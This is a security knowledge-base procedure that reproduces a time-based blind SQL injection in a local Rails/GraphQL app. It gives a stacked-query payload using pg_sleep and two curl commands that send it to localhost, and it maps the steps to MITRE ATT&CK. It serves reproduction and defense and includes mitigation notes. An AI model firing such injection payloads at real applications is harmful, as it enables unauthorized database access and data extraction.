---
tags:
  - sqli
  - reproduction
  - local
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-local-sqli-repro]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:00.320Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: b53ccb8e-71b1-4f1b-9805-3301a2794f0b
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Reproduce-SQL-Injection-Locally

## Summary

This procedure reproduces a SQL injection vulnerability locally by crafting a payload in the embedded_submission_form_uuid parameter to execute arbitrary PostgreSQL commands, demonstrating time-based blind injection with pg_sleep.

## Description

Targeted at local Rails/GraphQL setups on localhost:8080, the payload '1';SELECT 1;SELECT pg_sleep(30);--' closes the string, executes benign SELECTs, and delays response to confirm execution. This mirrors the HackerOne vulnerability allowing schema switching and data extraction. Prerequisites: Running local instance with PostgreSQL. Outcomes: Proof of arbitrary SQL without production risk.

## Requirements

1. Local development server (Rails, GraphQL, PostgreSQL on port 8080)
2. curl installed
3. Understanding of URL encoding for payloads

## Defense

Defensive measures and detection strategies:

- Sanitize all GraphQL inputs with libraries like graphql-ruby's built-in escaping
- Enable query logging in PostgreSQL to detect pg_sleep or unusual delays
- Use connection pooling with session isolation to limit injection scope

## Objectives

1. Confirm SQL injection via delayed responses
2. Validate payload execution in secure schema context
3. Test for arbitrary command capabilities

## Instructions

### Step 1: Craft and Send Injection Payload

**Context**: Inject SQL to break out of the parameter string and execute commands.

**Command** ([[commands/curl-local-sqli-repro]]):

```bash
curl -X POST http://localhost:8080/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2830%29%3B--%27
```

> URL-encoded payload executes SELECT 1 and pg_sleep(30). Expected output: Response delayed by ~30 seconds, confirming injection.

### Step 2: Observe Response Behavior

**Context**: Verify no syntax error and successful execution.

**Command** (Repeat with Timing):

```bash
time curl -X POST http://localhost:8080/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2830%29%3B--%27
```

> Measures exact delay. Expected output: real time ~30s, JSON response {}.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-local-sqli-repro]]

## Tools Used

- [[tools/curl]]

## Tags

- sqli
- reproduction
- local
